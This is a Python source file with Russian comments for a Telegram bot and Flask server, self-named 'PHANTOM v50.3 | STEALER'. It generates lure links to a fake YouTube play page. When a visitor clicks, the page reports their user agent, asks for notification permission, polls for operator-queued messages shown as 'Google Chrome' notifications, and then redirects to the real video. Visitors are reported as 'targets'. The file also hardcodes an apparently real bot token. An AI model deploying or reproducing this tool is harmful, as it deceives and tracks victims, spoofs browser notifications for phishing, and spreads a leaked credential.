import threading, requests, json, os, base64
from flask import Flask, render_template_string, request, jsonify
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor

# --- [1] НАСТРОЙКИ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OVERLORD_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com"
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# Очередь команд (хранится в RAM, очень быстро)
active_commands = {}

# --- [2] ЛЕГКИЙ ИНТЕРФЕЙС (HTML/JS) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
<body style="margin:0; background:#000; height:100vh; overflow:hidden;" onclick="init()">
    <div style="width:100%; height:100%; background:url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover; display:flex; align-items:center; justify-content:center;">
        <div style="width:70px; height:46px; background:#f00; border-radius:12px; position:relative;">
            <div style="position:absolute; left:28px; top:13px; border-left:20px solid #fff; border-top:10px solid transparent; border-bottom:10px solid transparent;"></div>
        </div>
    </div>
<script>
let sid="{{sid}}", active=false;
function init() {
    if(active) return; active = true;
    // Мгновенный лог через Beacon API (не тормозит страницу)
    navigator.sendBeacon('/log', btoa(JSON.stringify({sid:sid, ua:navigator.userAgent})));
    
    // Запрос на уведомления
    Notification.requestPermission();
    
    // Опрос сервера на наличие новых ПУШЕЙ (раз в 4 сек)
    setInterval(async () => {
        try {
            let r = await fetch('/poll/' + sid);
            let c = await r.json();
            if(c.type === 'push') new Notification("Google Chrome", {body: c.txt});
        } catch(e){}
    }, 4000);
    
    // Увод на реальное видео через 1.5 сек
    setTimeout(() => { window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ"); }, 1500);
}
</script>
</body></html>
"""

# --- [3] БЭКЕНД СЕРВЕР (Flask) ---
@app.route('/ping')
def ping(): return "ALIVE", 200

@app.route('/v/<sid>')
def view(sid): return render_template_string(HTML_TEMPLATE, sid=sid)

@app.route('/log', methods=['POST'])
def logger():
    try:
        raw_data = base64.b64decode(request.get_data()).decode()
        data = json.loads(raw_data)
        # Отправка уведомления в ТГ о новой жертве
        text = f"🎯 **ЦЕЛЬ В СЕТИ**\\nID: `{data['sid']}`\\nDevice: `{data['ua'][:45]}...`"
        requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                      json={"chat_id": int(data['sid']), "text": text, "parse_mode": "Markdown"})
    except: pass
    return "OK"

@app.route('/poll/<sid>')
def poll(sid): return jsonify(active_commands.pop(str(sid), {"type": "none"}))

# --- [4] ТЕЛЕГРАМ БОТ (aiogram 2.x) ---
@dp.message_handler(commands=['start'])
async def cmd_start(m: types.Message):
    link = f"{BASE_URL}/v/{m.chat.id}"
    await m.answer(f"🕶 **PHANTOM v50.3 | STEALER**\\n\\n🔗 Твоя ссылка:\\n`{link}`")

@dp.message_handler()
async def handle_admin(m: types.Message):
    # Команда от Оверлорда для пуша: "ID ТЕКСТ"
    if m.chat.id == OVERLORD_ID:
        try:
            parts = m.text.split(" ", 1)
            if len(parts) == 2:
                target_id, push_text = parts
                active_commands[str(target_id)] = {"type": "push", "txt": push_text}
                await m.answer(f"✅ Пуш для `{target_id}` поставлен в очередь.")
        except: pass

def run_flask():
    app.run(host='0.0.0.0', port=PORT)

if __name__ == '__main__':
    # Запуск Flask в фоновом потоке
    threading.Thread(target=run_flask, daemon=True).start()
    # Запуск бота (Polling)
    executor.start_polling(dp, skip_updates=True)
